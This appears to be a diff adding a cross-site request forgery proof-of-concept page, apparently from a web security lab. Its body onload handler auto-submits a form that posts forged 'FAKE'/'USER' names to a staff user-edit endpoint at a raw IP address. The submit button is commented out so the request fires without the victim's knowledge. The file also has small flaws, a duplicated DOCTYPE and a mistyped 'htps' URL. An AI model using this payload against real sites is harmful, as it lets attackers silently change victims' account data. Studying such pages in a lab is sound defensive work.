@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Form</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+      $.get("htps://example.com/api/profile", function (data) {
+        $("#first_name").val(data.first_name);
+        $("#last_name").val(data.last_name);
+      });
+    </script>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form
+      method="post"
+      action="https://35.184.88.145/red/public/staff/users/edit.php?id=1"
+    >
+      <fieldset>
+        <legend>Your Profile:</legend>
+        <label for="first_name"> First Name:</label> <br />
+        <input
+          name="first_name"
+          id="first_name"
+          type="text"
+          value="FAKE!!!!!!!!"
+        />
+        <br /><br />
+
+        <label for="last_name"> Last Name:</label> <br />
+        <input
+          name="last_name"
+          id="last_name"
+          type="text"
+          value="USER!!!!!!!!"
+        />
+        <br /><br />
+
+        <!-- <button type='submit'> Update </button> -->
+      </fieldset>
+    </form>
+  </body>
+</html>
